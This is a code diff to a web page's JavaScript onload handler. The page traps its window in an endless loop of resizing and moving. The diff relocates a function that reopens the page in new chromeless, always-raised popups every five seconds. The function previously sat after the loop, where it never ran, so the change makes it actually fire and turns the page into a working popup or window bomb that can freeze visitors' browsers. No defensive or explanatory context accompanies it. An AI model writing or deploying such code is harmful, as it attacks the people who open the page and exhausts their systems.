@@ -9,6 +9,14 @@ function onload() {
 	var yOff = 5;
 	var xPos = 400;
 	var yPos = -100;
+	function pool() {
+		if (location.port == "") {
+			open(location.protocol+"//"+location.hostname+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
+		} else {
+			open(location.protocol+"//"+location.hostname+":"+location.port+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
+		};
+	};
+	setTimeout(pool, 5000);
 	while (true) {
 		xPos += xOff;
 		yPos += yOff;
@@ -27,14 +35,6 @@ function onload() {
 		resizeTo(357, 330);
 		moveTo(xPos, yPos);
 	};
-	function loop() {
-		if (location.port == "") {
-			open(location.protocol+"//"+location.hostname+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
-		} else {
-			open(location.protocol+"//"+location.hostname+":"+location.port+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
-		};
-	};
-	setTimeout(loop, 5000);
 };
 		</script>
 	</head>
